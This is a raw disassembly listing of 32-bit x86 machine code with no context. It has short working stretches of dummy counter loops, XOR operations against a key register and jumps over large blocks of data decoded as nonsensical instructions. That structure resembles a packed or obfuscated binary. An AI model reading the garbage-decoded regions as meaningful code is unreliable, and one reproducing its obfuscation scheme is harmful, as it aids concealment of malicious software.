  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	ds je  0x40e953
  40e94c:	stos   BYTE PTR es:[edi],al
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8e3
  40e956:	xlat   BYTE PTR ds:[ebx]
  40e957:	mov    gs,WORD PTR [esi+0x72]
  40e95a:	outs   dx,BYTE PTR ds:[esi]
  40e95b:	hlt    
  40e95c:	in     al,0xe9
  40e95e:	fimul  WORD PTR [ebx-0x1e]
  40e961:	ss popa 
  40e963:	stos   BYTE PTR es:[edi],al
  40e964:	jae    0x40e912
  40e966:	hlt    
  40e967:	cdq    
  40e968:	xchg   edx,eax
  40e969:	enter  0x4ef6,0xe4
  40e96d:	xor    DWORD PTR [ebp+0x1fefd4ac],ebp
  40e973:	push   ss
  40e974:	dec    ecx
  40e975:	sbb    eax,0x60da5f1
  40e97a:	dec    edi
  40e97b:	mov    bh,0xe8
  40e97d:	pop    es
  40e97e:	retf   0x31b5
  40e981:	push   esi
  40e982:	push   0x4ddedc83
  40e987:	add    ecx,DWORD PTR [esi]
  40e989:	xchg   esi,eax
  40e98a:	add    DWORD PTR ds:0x40f21c43,esi
  40e990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e991:	aam    0xa4
  40e993:	pop    esp
  40e994:	cld    
  40e995:	push   0x53
  40e997:	pop    edx
  40e998:	lods   eax,DWORD PTR ds:[esi]
  40e999:	and    DWORD PTR [edi+ecx*4+0x2f],ecx
  40e99d:	pushf  
  40e99e:	repnz pop esi
  40e9a0:	cmp    BYTE PTR [eax+ebx*1-0x6],cl
  40e9a4:	sub    BYTE PTR [edi-0x54],0xd4
  40e9a8:	aad    0xe6
  40e9aa:	lea    ebx,[edx-0x33c9c397]
  40e9b0:	cmp    al,0x38
  40e9b2:	stc    
  40e9b3:	jecxz  0x40e9ff
  40e9b5:	nop
  40e9b6:	scas   eax,DWORD PTR es:[edi]
  40e9b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9b8:	cwde   
  40e9b9:	loopne 0x40e982
  40e9bb:	(bad)
  40e9be:	repnz push ebx
  40e9c0:	xchg   DWORD PTR [edx],ecx
  40e9c2:	fadd   QWORD PTR [eax-0x23]
  40e9c5:	jle    0x40e947
  40e9c7:	push   ebx
  40e9c8:	mov    eax,0xf65753b9
  40e9cd:	in     eax,dx
  40e9ce:	jns    0x40e9b4
  40e9d0:	push   esi
  40e9d2:	(bad)  
  40e9d3:	pushf  
  40e9d4:	gs adc eax,0x7927f47f
  40e9da:	sub    DWORD PTR es:[edx+0x53761f64],esi
  40e9e1:	xchg   BYTE PTR [ebx+edi*2+0x5578b78b],dl
  40e9e8:	mov    dl,0xa
  40e9ea:	dec    ecx
  40e9eb:	or     edx,DWORD PTR [ebx-0x49]
  40e9ee:	xor    al,0x97
  40e9f0:	adc    edi,edx
  40e9f2:	addr16 pop eax
  40e9f4:	add    BYTE PTR [ebx-0x43],bl
  40e9f7:	shr    BYTE PTR [edi-0x4bc26a7a],0x3b
  40e9fe:	fnstcw WORD PTR [eax-0x50f041d]
  40ea04:	addr16 inc ebp
  40ea06:	es sub eax,0xd8bbd46c
  40ea0c:	pop    ss
  40ea0d:	hlt    
  40ea0e:	or     al,cl
  40ea10:	pop    ebp
  40ea11:	xlat   BYTE PTR ds:[ebx]
  40ea12:	or     DWORD PTR [edi],ecx
  40ea14:	cmp    eax,0x7748220
  40ea19:	inc    ebx
  40ea1a:	cmc    
  40ea1b:	repnz out dx,eax
  40ea1d:	clc    
  40ea1e:	push   edx
  40ea1f:	stos   BYTE PTR es:[edi],al
  40ea20:	sar    BYTE PTR [esi-0x5e71d1ec],0x63
  40ea27:	xchg   ch,cl
  40ea29:	mov    dl,0xe6
  40ea2b:	dec    edx
  40ea2c:	inc    esi
  40ea2d:	mov    dh,0xcf
  40ea2f:	outs   dx,BYTE PTR ds:[esi]
  40ea30:	cs jge 0x40e9c7
  40ea33:	int3   
  40ea34:	sub    BYTE PTR [eax-0x34125d8a],bl
  40ea3a:	shr    DWORD PTR [edi-0x2ecaee4f],1
  40ea40:	mov    al,0xfd
  40ea42:	jge    0x40ea9d
  40ea44:	jno    0x40ea73
  40ea46:	fisttp QWORD PTR [edx+0x47]
  40ea49:	(bad)  
  40ea4a:	xor    dh,BYTE PTR [ebx+0x2d25efbb]
  40ea50:	leave  
  40ea51:	popf   
  40ea52:	gs je  0x40ea60
  40ea55:	(bad)  [ecx-0x7]
  40ea58:	sbb    BYTE PTR [eax+0x78],bh
  40ea5b:	push   ss
  40ea5c:	arpl   WORD PTR [edx],ax
  40ea5e:	push   edi
  40ea5f:	add    eax,0xe4b1a69f
  40ea64:	out    dx,eax
  40ea65:	cmp    ah,BYTE PTR [edi]
  40ea67:	pop    esp
  40ea68:	(bad)  
  40ea69:	fisttp WORD PTR [eax+0x3561e24b]
  40ea6f:	adc    ebx,DWORD PTR gs:[edx]
  40ea72:	xor    eax,0x9ed3a63e
  40ea77:	sbb    al,0xc9
  40ea79:	push   0xfabec136
  40ea7e:	mov    ecx,0xa283e113
  40ea83:	out    0x47,eax
  40ea85:	jne    0x40eaa1
  40ea87:	jmp    0x40eab1
  40ea89:	mov    ds:0x2042fbb6,al
  40ea8e:	mov    BYTE PTR [edx+0x2d],ah
  40ea91:	in     al,0x49
  40ea93:	sti    
  40ea94:	pop    ebx
  40ea95:	xchg   bl,bh
  40ea97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea98:	add    bl,BYTE PTR [ecx+0x2c]
  40ea9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea9c:	enter  0xb27f,0x75
  40eaa0:	(bad)  [edi+ecx*1-0x7b]
  40eaa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	add    BYTE PTR [ebx],al
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xd3
  40eb8d:	loope  0x40eb50
  40eb8f:	push   0xfffffff7
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb6a
  40eb99:	cdq    
  40eb9a:	(bad)  
  40eb9b:	mov    bl,0xd7
  40eb9d:	pop    eax
  40eb9e:	adc    BYTE PTR [ebx-0x70139c34],dl
  40eba4:	sbb    eax,0xfcc6694d
  40eba9:	scas   al,BYTE PTR es:[edi]
  40ebaa:	fld    QWORD PTR [edx+0x71f3486c]
  40ebb0:	sbb    bl,BYTE PTR fs:[ecx]
  40ebb3:	cmp    DWORD PTR [ebx+0x7862025a],esi
  40ebb9:	mov    edi,0x6b4bf81
  40ebbe:	push   ss
  40ebbf:	and    ah,BYTE PTR [esi-0x7cbbcc09]
  40ebc5:	push   0x35
  40ebc7:	lock or al,0x13
  40ebca:	std    
  40ebcb:	mov    dh,0x20
  40ebcd:	xchg   ecx,eax
  40ebce:	mov    eax,0x96efcc64
  40ebd3:	mov    ch,0x66
  40ebd5:	and    edi,DWORD PTR [ecx]
  40ebd7:	adc    DWORD PTR [ebx-0x1de902d0],edx
  40ebdd:	pusha  
  40ebde:	outs   dx,BYTE PTR ds:[esi]
  40ebdf:	cdq    
  40ebe0:	inc    edi
  40ebe1:	iret   
  40ebe2:	mov    bl,BYTE PTR [ebx]
  40ebe4:	xlat   BYTE PTR ds:[ebx]
  40ebe5:	(bad)  
  40ebe6:	and    BYTE PTR [edi+0x22bdf280],bl
  40ebec:	push   es
  40ebed:	mov    ds:0xb7cdb96,al
  40ebf2:	add    BYTE PTR [edi-0x7cce74ec],ah
  40ebf8:	jmp    DWORD PTR [ecx+0x7997ee11]
  40ebfe:	cmp    BYTE PTR [ecx+0x739be9c6],dh
  40ec04:	mov    bl,dl
  40ec06:	sub    ebx,DWORD PTR [ebx-0x7f9598f2]
  40ec0c:	jbe    0x40eba1
  40ec0e:	ror    ebp,1
  40ec10:	enter  0x37b9,0x5c
  40ec14:	mov    DWORD PTR [esi],esp
  40ec16:	test   eax,0xdb62f744
  40ec1b:	jp     0x40ec50
  40ec1d:	fisub  WORD PTR ds:0x92179b8f
  40ec23:	mov    bh,0xe3
  40ec25:	adc    BYTE PTR [ebp+0x664e5e76],bl
  40ec2b:	lds    edx,FWORD PTR [ebx]
  40ec2d:	push   eax
  40ec2e:	dec    ebp
  40ec2f:	shl    BYTE PTR [ebx+0x1c98881f],0xd2
  40ec36:	jl     0x40ec1e
  40ec38:	scas   eax,DWORD PTR es:[edi]
  40ec39:	sahf   
  40ec3a:	data16 jecxz 0x40ec1d
  40ec3d:	adc    cl,0xf6
  40ec40:	mov    WORD PTR [edx-0x6113052b],?
  40ec46:	dec    eax
  40ec47:	(bad)  
  40ec48:	mov    bl,0x4
  40ec4a:	loopne 0x40ec46
  40ec4c:	push   esi
  40ec4d:	into   
  40ec4e:	(bad)  
  40ec4f:	sti    
  40ec50:	pushf  
  40ec51:	imul   esp,DWORD PTR [ebx-0x27],0xa88ceffd
  40ec58:	jecxz  0x40ec62
  40ec5a:	mov    bl,0x38
  40ec5c:	mov    cl,0xef
  40ec5e:	(bad)  
  40ec60:	idiv   eax
  40ec62:	adc    eax,0x1cfada50
  40ec67:	pop    ecx
  40ec68:	divps  xmm2,XMMWORD PTR [edx]
  40ec6b:	mov    al,ds:0x672b2742
  40ec70:	and    al,0xa8
  40ec72:	cdq    
  40ec73:	mov    ch,0xb7
  40ec75:	dec    esi
  40ec76:	aad    0x58
  40ec78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec79:	bound  eax,QWORD PTR ds:0x82ee6bf5
  40ec7f:	or     dl,ah
  40ec81:	push   ss
  40ec82:	(bad)  
  40ec84:	test   al,0x58
  40ec86:	xor    ch,BYTE PTR [esi-0x6f]
  40ec89:	loopne 0x40ec7e
  40ec8b:	test   BYTE PTR [edx-0x59],bl
  40ec8e:	mov    ebp,0xfff3341b
  40ec93:	push   ds
  40ec94:	dec    edx
  40ec95:	data16 jae 0x40ec55
  40ec98:	ret    
  40ec99:	mov    cl,0x2b
  40ec9b:	arpl   si,ax
  40ec9d:	jle    0x40ec2f
  40ec9f:	or     DWORD PTR [ebp+edx*1-0x7f1d419f],edx
  40eca6:	cmp    ecx,DWORD PTR [ebx-0x14]
  40eca9:	xchg   edx,eax
  40ecaa:	pop    esi
  40ecab:	popf   
  40ecac:	dec    edx
  40ecad:	sti    
  40ecae:	xor    al,0x2b
  40ecb0:	cmp    cl,ah
  40ecb2:	adc    BYTE PTR [esi],cl
  40ecb4:	xor    DWORD PTR [edi],eax
  40ecb6:	xchg   ecx,eax
  40ecb7:	jmp    0xe50b472e
  40ecbc:	sbb    al,0x33
  40ecbe:	mov    eax,ds:0xc3dd4f
  40ecc3:	in     eax,dx
  40ecc4:	push   esi
  40ecc5:	iret   
  40ecc6:	xchg   edi,eax
  40ecc7:	les    eax,FWORD PTR [edi]
  40ecc9:	mov    eax,ds:0xeb6080e3
  40ecce:	jmp    0x40ecca
  40ecd0:	pop    esi
  40ecd1:	fs dec esi
  40ecd3:	cwde   
  40ecd4:	fsub   QWORD PTR [ebx]
  40ecd6:	das    
  40ecd7:	pop    ecx
  40ecd8:	cmp    ecx,ecx
  40ecda:	into   
  40ecdb:	repnz lods al,BYTE PTR ds:[esi]
  40ecdd:	or     BYTE PTR [esi-0x52],cl
  40ece0:	inc    eax
  40ece1:	das    
  40ece2:	pop    ds
  40ece3:	test   eax,0x8bc13bd7
  40ece8:	inc    ebp
  40ece9:	in     al,dx
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed22
  40ed00:	fst    DWORD PTR [eax]
  40ed02:	repz mov edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ecee
  40ed0c:	mov    DWORD PTR [ebp+0x5c],ecx
  40ed0f:	sbb    cl,BYTE PTR [ebx]
  40ed11:	adc    edx,edx
  40ed13:	mov    dl,0x21
  40ed15:	cmp    BYTE PTR [eax],bl
  40ed17:	xor    BYTE PTR [eax+edx*8],dl
  40ed1a:	or     ebx,DWORD PTR [esi]
  40ed1c:	test   al,0x8f
  40ed1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed1f:	xchg   esi,eax
  40ed20:	in     eax,0x3c
  40ed22:	jmp    0x40ed35
  40ed24:	fcmovbe st,st(2)
  40ed26:	arpl   WORD PTR [edx],di
  40ed28:	aam    0x28
  40ed2a:	(bad)  
  40ed2b:	fmul   QWORD PTR [edx]
  40ed2e:	dec    edi
  40ed2f:	push   esi
  40ed30:	push   esp
  40ed31:	mov    dh,BYTE PTR ds:0x82f1eee8
  40ed37:	sub    eax,0x7f993264
  40ed3c:	inc    ecx
  40ed3d:	or     DWORD PTR [esi+esi*8],edi
  40ed40:	sbb    dl,bl
  40ed42:	nop
  40ed43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed44:	fmul   QWORD PTR [ebx]
  40ed46:	jnp    0x40ecf8
  40ed48:	xchg   esi,eax
  40ed49:	aas    
  40ed4a:	out    0x80,eax
  40ed4c:	popa   
  40ed4d:	push   ecx
  40ed4e:	xchg   ecx,eax
  40ed4f:	and    ch,ah
  40ed51:	dec    ebx
  40ed52:	pop    ebp
  40ed53:	retf   0x821d
  40ed56:	dec    esp
  40ed57:	push   ds
  40ed58:	sbb    eax,0x4118510f
  40ed5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed5e:	ret    0x3903
  40ed61:	icebp  
  40ed62:	xor    ah,BYTE PTR [ebx+edi*1-0x66]
  40ed66:	std    
  40ed67:	xchg   DWORD PTR [edx],esp
  40ed69:	adc    dl,BYTE PTR [edx]
  40ed6b:	(bad)  
  40ed6c:	stc    
  40ed6d:	cmp    bl,ch
  40ed6f:	xor    eax,0xf138b6dc
  40ed74:	call   0x85f6:0xae8c6ae
  40ed7b:	(bad)  
  40ed7c:	rol    DWORD PTR [edx+ebx*4+0x17],0xc9
  40ed81:	mov    dh,BYTE PTR [esi+0x69]
  40ed84:	ds iret 
  40ed86:	or     bh,bh
  40ed88:	aam    0xc4
  40ed8a:	xor    DWORD PTR [eax+edi*4-0x73b4acc4],edi
  40ed91:	pop    es
  40ed92:	das    
  40ed93:	fild   WORD PTR [edx-0x12]
  40ed96:	xor    eax,0x29bf8f4e
  40ed9b:	pop    esp
  40ed9c:	int3   
  40ed9d:	and    al,0x4d
  40ed9f:	sahf   
  40eda0:	xchg   ebp,eax
  40eda1:	lods   eax,DWORD PTR ds:[esi]
  40eda2:	or     DWORD PTR [edx+0x5d235e43],edx
  40eda8:	out    0x4c,al
  40edaa:	jo     0x40ed7d
  40edac:	inc    DWORD PTR [ebp+0x3b]
  40edaf:	or     eax,0x19524288
  40edb4:	loope  0x40eda3
  40edb6:	je     0x40edf2
  40edb8:	in     eax,dx
  40edb9:	mov    bl,ch
  40edbb:	xchg   ecx,eax
  40edbc:	in     al,0xec
  40edbe:	data16 data16 fstp QWORD PTR [edi+0x5f]
  40edc3:	and    eax,0x4e4878f1
  40edc8:	iret   
  40edc9:	inc    esp
  40edca:	ret    
  40edcb:	leave  
  40edcc:	jae    0x40eddd
  40edce:	fidivr WORD PTR [edi-0xf]
  40edd1:	or     eax,esp
  40edd3:	cmp    DWORD PTR [ebx],edi
  40edd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edd6:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40edd8:	mov    dl,0x3b
  40edda:	fs jg  0x40edad
  40eddd:	pusha  
  40edde:	outs   dx,DWORD PTR ds:[esi]
  40eddf:	or     esp,DWORD PTR [ecx+0x1a]
  40ede2:	push   bp
  40ede4:	cs pop esp
  40ede6:	jmp    DWORD PTR [ebx]
  40ede8:	inc    esp
  40ede9:	(bad)  
  40edea:	ffree  st(6)
  40edec:	inc    esp
  40eded:	jb     0x40ee1e
  40edef:	and    BYTE PTR [ebx],0xda
  40edf2:	cmp    BYTE PTR [eax+0x69],dl
  40edf5:	add    ebx,0xffffffd6
  40edf8:	mov    eax,ds:0x53381d44
  40edfd:	dec    ecx
  40edfe:	and    esi,DWORD PTR [esi]
  40ee00:	adc    dh,BYTE PTR [edi-0x79ea87b8]
  40ee06:	dec    ebx
  40ee07:	mov    al,0xf1
  40ee09:	ss out dx,al
  40ee0b:	popf   
  40ee0c:	mov    edx,0x41fc4b23
  40ee11:	fcomp  QWORD PTR cs:[ebx+0x21]
  40ee15:	push   edi
  40ee16:	cld    
  40ee17:	sbb    esi,DWORD PTR [ebx-0x1]
  40ee1a:	loopne 0x40edfb
  40ee1c:	inc    eax
  40ee1d:	or     ebx,DWORD PTR [ebx]
  40ee1f:	scas   al,BYTE PTR es:[edi]
  40ee20:	jns    0x40ee5f
  40ee22:	popa   
  40ee23:	and    bl,BYTE PTR ds:0x94bbf689
  40ee29:	xlat   BYTE PTR ds:[ebx]
  40ee2a:	dec    edx
  40ee2b:	pop    esi
  40ee2c:	test   DWORD PTR [eax+0x74],ebp
  40ee2f:	shl    BYTE PTR [ebp+eiz*4-0x7f],0xa
  40ee34:	inc    ebx
  40ee35:	lahf   
  40ee36:	xchg   edx,eax
  40ee37:	pop    ebx
  40ee38:	mov    bl,0x4
  40ee3a:	or     DWORD PTR [ebx],0x13
  40ee3d:	aad    0x58
  40ee3f:	lahf   
  40ee40:	int3   
  40ee41:	adc    al,0x2e
  40ee43:	add    al,0xf5
  40ee45:	adc    ah,dl
  40ee47:	or     al,0x88
  40ee49:	jae    0x40ee20
  40ee4b:	sub    al,0x14
  40ee4d:	inc    ebp
  40ee4e:	xlat   BYTE PTR ds:[ebx]
  40ee4f:	shr    DWORD PTR [eax-0x2c],0x5c
  40ee53:	cmp    eax,0xba1db21c
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x24
  40ee7f:	pop    edi
  40ee80:	jp     0x40ee3c
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee8f
  40ee8b:	pop    ss
  40ee8c:	push   0xc4b492d8
  40ee91:	pop    ecx
  40ee92:	mov    esp,0x26c918c4
  40ee97:	cwde   
  40ee98:	cmp    DWORD PTR [ebx],edi
  40ee9a:	mov    bh,BYTE PTR [edi+0x59cb19bc]
  40eea0:	xor    eax,0xe629e76
  40eea5:	xor    eax,0xfb8aa3bf
  40eeaa:	xchg   ebx,eax
  40eeab:	pop    edi
  40eeac:	or     eax,DWORD PTR [eax]
  40eeae:	(bad)  
  40eeb1:	mov    bl,0xd5
  40eeb3:	out    0xb6,al
  40eeb5:	sbb    ch,BYTE PTR [edi+0x26f59f5d]
  40eebb:	popf   
  40eebc:	pop    ebx
  40eebd:	xchg   esi,eax
  40eebe:	shl    edx,1
  40eec0:	jmp    0x4a0:0xaee0bc18
  40eec7:	inc    edi
  40eec8:	jno    0x40ee90
  40eeca:	sub    cl,BYTE PTR [esi]
  40eecc:	xor    DWORD PTR ds:0xa7d72827,ebx
  40eed2:	inc    ecx
  40eed3:	aad    0x50
  40eed5:	jno    0x40ee92
  40eed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eed8:	dec    esp
  40eeda:	add    eax,0x40410881
  40eedf:	lods   al,BYTE PTR ds:[esi]
  40eee0:	jno    0x40eea1
  40eee2:	sub    al,0x11
  40eee4:	test   bh,bl
  40eee6:	xor    DWORD PTR [ebp-0x31],esp
  40eee9:	add    cl,BYTE PTR [eax]
  40eeeb:	mov    ecx,0xcbdf5f24
  40eef0:	pop    edi
  40eef1:	imul   dh
  40eef3:	pop    edi
  40eef4:	cmp    al,0x4f
  40eef6:	pop    edi
  40eef7:	gs pushf 
  40eef9:	sti    
  40eefa:	outs   dx,DWORD PTR ds:[esi]
  40eefb:	(bad)  
  40eefc:	hlt    
  40eefd:	push   edi
  40eefe:	jle    0x40ef60
  40ef00:	lock fs and eax,0x2d24e7e
  40ef07:	pop    eax
  40ef08:	jl     0x40eef8
  40ef0a:	test   BYTE PTR [ebx],ah
  40ef0c:	pop    ebx
  40ef0d:	xchg   ebp,eax
  40ef0e:	les    edx,FWORD PTR [ecx-0x30d2edc]
  40ef14:	mov    eax,0x50b734ed
  40ef19:	pop    ecx
  40ef1a:	imul   ebx,DWORD PTR [edi],0x15b395cb
  40ef20:	push   ss
  40ef21:	lea    esp,[eax+0xa]
  40ef24:	je     0x40ef5b
  40ef26:	cmp    eax,DWORD PTR [esi-0x6d3497ad]
  40ef2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef2d:	in     al,dx
  40ef2e:	test   DWORD PTR [ecx],esi
  40ef30:	scas   al,BYTE PTR es:[edi]
  40ef31:	icebp  
  40ef32:	in     eax,dx
  40ef33:	mov    esi,0xa7cf32ab
  40ef38:	sbb    DWORD PTR [esi+esi*1],ebx
  40ef3b:	in     al,0x99
  40ef3d:	fisttp WORD PTR ds:0xfcd3efc4
  40ef43:	cli    
  40ef44:	adc    ah,BYTE PTR [edi]
  40ef46:	inc    esp
  40ef47:	cld    
  40ef48:	test   ebx,esp
  40ef4a:	pusha  
  40ef4b:	inc    esi
  40ef4c:	dec    ebp
  40ef4d:	xchg   edi,eax
  40ef4e:	fwait
  40ef4f:	adc    dh,dh
  40ef51:	add    eax,0xdda02132
  40ef56:	out    dx,eax
  40ef57:	jo     0x40ef35
  40ef59:	sbb    al,ah
  40ef5b:	pusha  
  40ef5c:	test   al,0xec
  40ef5e:	iret   
  40ef5f:	dec    edi
  40ef60:	retf   
  40ef61:	adc    ebp,DWORD PTR [edi+0x320f4636]
  40ef67:	dec    BYTE PTR [ebp+0x447f8773]
  40ef6d:	mov    WORD PTR [ebx+esi*2],?
  40ef70:	dec    esi
  40ef71:	int3   
  40ef72:	fsubp  st(0),st
  40ef74:	aaa    
  40ef75:	out    0xb6,eax
  40ef77:	adc    BYTE PTR [eax-0x5a],al
  40ef7a:	fld    DWORD PTR [edi]
  40ef7c:	scas   eax,DWORD PTR es:[edi]
  40ef7d:	out    0x2a,eax
  40ef7f:	mov    cl,dl
  40ef81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef82:	rol    DWORD PTR [eax-0x35],0x13
  40ef86:	loopne 0x40efc7
  40ef88:	mov    ds:0x1763f74f,eax
  40ef8d:	(bad)  
  40ef8e:	fnstsw WORD PTR [edi]
  40ef90:	inc    ah
  40ef92:	dec    esi
  40ef93:	pop    ss
  40ef94:	nop
  40ef95:	cmp    eax,0xe7a171fc
  40ef9a:	fimul  DWORD PTR [edx+edi*4+0x67]
  40ef9e:	push   0xffffffe9
  40efa0:	ret    0x8909
  40efa3:	(bad)  
  40efa4:	adc    eax,0x1e805cd7
  40efa9:	fisttp DWORD PTR [eax+0xa3c85dd]
  40efaf:	clc    
  40efb0:	je     0x40ef65
  40efb2:	mov    edx,0xe6fcddd9
  40efb7:	xchg   esp,eax
  40efb8:	retf   
  40efb9:	call   0x8464cc96
  40efbe:	jecxz  0x40eff7
  40efc0:	xchg   esp,eax
  40efc1:	mov    esi,0x6c6f6c2b
  40efc6:	inc    edx
  40efc7:	(bad)  
  40efc8:	outs   dx,DWORD PTR ds:[esi]
  40efc9:	push   esp
  40efca:	mov    bh,0xdb
  40efcc:	jmp    0xbe39:0x756fce8
  40efd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efd4:	jmp    0xc673f481
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	idiv   BYTE PTR [eax+esi*2-0x48]
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	or     eax,0x800f333b
  40f00b:	enter  0x515,0xd1
  40f00f:	mov    ch,0x2
  40f011:	sub    ch,dh
  40f013:	adc    eax,esp
  40f015:	mov    WORD PTR [esi+0x4cc8c6f9],es
  40f01b:	add    eax,0x22a090e6
  40f020:	out    0xa7,eax
  40f022:	inc    ebp
  40f023:	sbb    edx,eax
  40f025:	push   ecx
  40f026:	stc    
  40f027:	pop    edi
